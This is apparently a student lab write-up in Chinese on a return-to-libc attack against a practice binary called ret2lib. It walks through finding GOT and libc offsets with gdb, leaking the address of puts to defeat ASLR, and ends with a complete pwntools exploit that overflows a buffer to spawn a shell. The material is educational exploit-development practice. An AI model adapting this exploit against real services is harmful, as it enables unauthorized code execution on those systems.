# Lab4 ret2lib

## 先備知識

### strtol()

`long int strtol(const char *str, char **endptr, int base)`

將str初始部分轉換為long int值

### 找dynamic relocation的offset

- gdb$ got
- objdump -R ./ret2lib
    - 驗證
        - 運行./ret2lib後，input我們得到的functon offset後會得到他的address，x/i <address>看是不是該function

### 找用gdb找return offset

- gdb$ pattc 100
    - 產生100個字元後塞到input去造成bof
- gdb$ crashoff
    - 會回傳return offset在哪裏

### libc中的/bin/sh字串位置

- gdb$ find "sh"

## Return to Library 解題步驟

1. 因為ASLR每次libc載入位置不固定，故我們需要先利用information leak去得到libc的base address
2. 利用base address和system offset可以得知system address
3. 用buffer overflow將return值改成system  address，進而使用system function執行shell命令開啟sh

## Solve

### 分析

1. See_somehting()會將輸入的內容做dereference，這邊就可以information leak得到base address
2. Print_message()中的strcpy(buf, mesg)因為buf[48]而mesg[256]，所以會有buffer overflow，可以藉此跳到system function

### 解題策略

1. 我選用puts的位置和offset來找base address → 得到system address
2. BOF return 跳到 system function並call "sh"

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "127.0.0.1"
port = 8888

r = remote(host,port)

r.recvuntil(":")
puts_got = 0x0804a01c # puts address, objdump -R ./ret2lib

r.sendline(str(puts_got)) # convert to decimal 
r.recvuntil(": ")
puts_adr = int(r.recvuntil("\n").strip(),16)
puts_off = 0x67460 # puts offset, gdb$ off puts
system_off = 0x3ce10 # system offset, gdb$ off system
libc = puts_adr - puts_off # address - offset = base
print "libc : ",hex(libc)
system = libc + system_off # system address
sh = 0x804829e # sh address, gdb$ find "sh"
r.recvuntil(":")
payload = "a"*60 # offset 
payload += p32(system)
payload += "bbbb" # fill up the return address,  or += p32(0xdeadbeef) is also fine
payload += p32(sh) # sh address
r.sendline(payload)
r.interactive()
```
